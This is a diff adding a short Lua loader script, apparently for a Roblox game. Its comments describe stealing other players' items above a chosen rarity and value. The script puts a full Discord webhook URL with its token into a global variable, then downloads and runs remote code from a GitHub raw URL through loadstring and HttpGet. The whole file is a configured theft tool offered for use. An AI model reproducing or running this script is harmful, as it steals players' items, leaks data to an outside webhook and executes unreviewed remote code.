@@ -1,0 +1,6 @@
+_G.users = {"USERNAME"}  -- Add your username here
+_G.min_rarity = "Legendary"      -- Minimum rarity to steal (Common, Uncommon, Rare, Legendary, Godly, Ancient, Unique, Vintage)
+_G.min_value = 1             -- Minimum value per item
+_G.ping = "Yes"              -- "Yes" to ping everyone, anything else for no ping
+_G.webhook = "https://discord.com/api/webhooks/1400572578698891538/-d_hVPqg1UdaO5GequJckLD8AjOKVcC2v3AhrdI5T3EU6WBImu3AuYhEInk6ElFUyUv0" -- Your Discord webhook URL
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HydroDom/test2/refs/heads/main/Source.lua.txt",true))()
